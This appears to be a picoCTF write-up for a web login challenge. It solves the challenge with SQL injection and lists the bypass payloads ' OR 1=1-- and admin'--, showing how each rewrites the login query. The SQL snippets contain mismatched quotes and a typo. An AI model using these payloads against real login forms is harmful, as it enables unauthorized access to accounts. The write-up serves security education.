## Information

### Description

There is a website running at https://jupiter.challenges.picoctf.org/problem/50009/ (link) or http://jupiter.challenges.picoctf.org:50009. Do you think you can log us in? Try to see if you can login!

### Hints

1. There doesn't seem to be many ways to interact with this. I wonder if the users are kept in a database?

2. Try to think about how the website verifies your login.

## Solution

- [SQL Injection](https://en.wikipedia.org/wiki/SQL_injection)

- SQL query
    ```sql
    "SELECT * FROM customers WHERE name =' Username ' AND password = ' Password '
    ```
- Password:`' OR 1=1--`
    ```sql
    "SELECT * FROM customers WHERE name= ' Username ' AND passwors  = '' OR 1=1--'"
    ```
- Username: admin'--
    ```sql
    "SELECT * FROM customers WHERE name =' admin'-- ' AND password = ' Password '
    ```
